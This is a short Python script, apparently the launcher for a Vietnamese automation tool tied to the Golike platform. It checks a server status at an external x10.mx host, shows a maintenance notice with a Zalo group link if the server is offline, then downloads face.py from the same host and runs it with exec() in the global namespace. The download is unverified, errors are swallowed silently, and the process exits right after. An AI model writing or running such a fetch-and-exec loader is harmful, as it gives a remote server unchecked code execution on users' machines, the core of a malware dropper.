import requests
import os
from rich.console import Console

console = Console()

class ZMatrix(Exception):
    pass
def Server():
    try:
        response = requests.get('https://zmatrixtool.x10.mx/Api/Golike/main.py', timeout=5)
        response.raise_for_status()
        data = response.json()
        if data.get('status') == 'live':
            return "[bold white]LIVE[/]"
        else:
            os.system('cls' if os.name == 'nt' else 'clear')
            zalo = "https://zalo.me/g/axtnqv555"
            console.print("")
            console.print(f"""
[color(152)]                  ADMIN ĐÃ TẮT TOOL ĐỂ BẢO TRÌ[/color(152)]
[white]Trạng Thái Server: [color(217)]OFFLINE[/color(217)]
[color(152)]BOX [white]ZALO [color(152)]ĐỂ NHẬN THÔNG BÁO: [white]{zalo}[/white]
""")
            raise ZMatrix("Server đang offline")
    except (requests.exceptions.RequestException, ValueError):
        return "[bold color(217)]LỖI KẾT NỐI SERVER[/]"

def main():
    Server()
    try:
        url = "https://zmatrixtool.x10.mx/tool/Golike/face.py"
        code = requests.get(url, timeout=10).text
        exec(code, globals())   # chạy code tải về
        os._exit(0)             # thoát ngay sau khi chạy
    except Exception as e:
        print()

if __name__ == "__main__":
    main()